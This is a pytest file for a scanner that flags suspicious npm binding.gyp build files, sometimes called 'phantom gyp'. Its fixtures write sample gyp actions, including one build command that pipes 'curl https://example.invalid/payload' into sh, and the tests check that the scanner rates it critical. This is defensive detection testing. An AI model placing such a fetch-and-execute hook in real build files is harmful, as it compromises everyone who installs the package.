"""Tests for binding.gyp (Phantom Gyp) scanner."""

from __future__ import annotations

import json

import pytest

from depfence.scanners.binding_gyp_scanner import BindingGypScanner


@pytest.fixture
def scanner():
    return BindingGypScanner()


@pytest.fixture
def project(tmp_path):
    return tmp_path


@pytest.mark.asyncio
async def test_phantom_gyp_no_native_sources(scanner, project):
    (project / "binding.gyp").write_text(json.dumps({
        "targets": [{
            "target_name": "addon",
            "sources": ["src/addon.js"],
        }]
    }))
    (project / "package.json").write_text(json.dumps({"name": "evil-package"}))
    (project / "index.js").write_text("module.exports = {};")

    findings = await scanner.scan_project(project)
    assert len(findings) == 1
    assert findings[0].severity.value == "high"
    assert "phantom gyp" in findings[0].title.lower()


@pytest.mark.asyncio
async def test_phantom_gyp_with_shell_commands(scanner, project):
    (project / "binding.gyp").write_text(json.dumps({
        "targets": [{
            "target_name": "addon",
            "actions": [{
                "action_name": "run_payload",
                "action": ["bash", "-c", "curl https://example.invalid/payload | sh"],
            }]
        }]
    }))
    (project / "package.json").write_text(json.dumps({"name": "evil-gyp"}))

    findings = await scanner.scan_project(project)
    assert len(findings) >= 1
    severities = {f.severity.value for f in findings}
    assert "critical" in severities


@pytest.mark.asyncio
async def test_real_native_addon_safe(scanner, project):
    """Real native addon with .c/.h files should NOT fire."""
    (project / "binding.gyp").write_text(json.dumps({
        "targets": [{
            "target_name": "native_addon",
            "sources": ["src/addon.cc", "src/addon.h"],
        }]
    }))
    src_dir = project / "src"
    src_dir.mkdir()
    (src_dir / "addon.cc").write_text('#include <napi.h>\nvoid Init() {}')
    (src_dir / "addon.h").write_text('#pragma once')
    (project / "package.json").write_text(json.dumps({"name": "real-addon"}))

    findings = await scanner.scan_project(project)
    assert len(findings) == 0


@pytest.mark.asyncio
async def test_native_addon_with_suspicious_commands(scanner, project):
    """Native addon with suspicious commands in gyp should flag medium."""
    (project / "binding.gyp").write_text(
        '{"targets": [{"target_name": "addon", "actions": [{"action": ["bash", "-c", "curl https://example.invalid/data"]}]}]}'
    )
    src_dir = project / "src"
    src_dir.mkdir()
    (src_dir / "addon.c").write_text('#include <stdio.h>')
    (project / "package.json").write_text(json.dumps({"name": "sus-addon"}))

    findings = await scanner.scan_project(project)
    assert len(findings) >= 1
    severities = {f.severity.value for f in findings}
    assert "medium" in severities or "high" in severities


@pytest.mark.asyncio
async def test_safe_prebuild_tooling(scanner, project):
    """Package using node-pre-gyp (known safe) emits low-confidence finding."""
    (project / "binding.gyp").write_text(json.dumps({
        "targets": [{
            "target_name": "addon",
            "actions": [{"action_name": "install", "action": ["node-pre-gyp", "install"]}],
        }]
    }))
    (project / "package.json").write_text(json.dumps({"name": "prebuild-pkg"}))

    findings = await scanner.scan_project(project)
    assert len(findings) >= 1
    assert all(f.confidence <= 0.5 for f in findings)


@pytest.mark.asyncio
async def test_no_binding_gyp(scanner, project):
    """No binding.gyp should return empty."""
    findings = await scanner.scan_project(project)
    assert len(findings) == 0


@pytest.mark.asyncio
async def test_scan_returns_empty(scanner):
    """Protocol compliance: scan() returns empty."""
    assert await scanner.scan([]) == []
